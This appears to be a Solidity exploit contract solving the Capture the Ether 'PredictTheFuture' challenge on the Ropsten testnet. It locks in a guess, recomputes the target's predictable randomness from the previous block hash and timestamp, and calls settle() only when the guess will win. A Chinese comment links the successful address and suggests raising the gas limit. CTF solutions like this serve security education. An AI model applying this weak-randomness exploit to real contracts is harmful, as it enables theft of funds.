pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {

        function lockInGuess(uint8 n) public payable;
        function settle() public;
}

contract attack{

    PredictTheFutureChallenge p =PredictTheFutureChallenge(0x538C24E51FCF978a0dEff9adC578bA30d0F8b9b4);

    function lock() payable{
        p.lockInGuess.value(1 ether)(2);

    }
       event h(string,uint8);
     function attackTarget() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        
      emit h("answer",answer);
        if(answer == 2){
            p.settle();
        }//https://ropsten.etherscan.io/address/0xcc69d43af9ec572315e05586310aa8fdb51e18d9 成功地址  建议调整燃料限制加个0 
    }

    function() external payable{ 
    }
}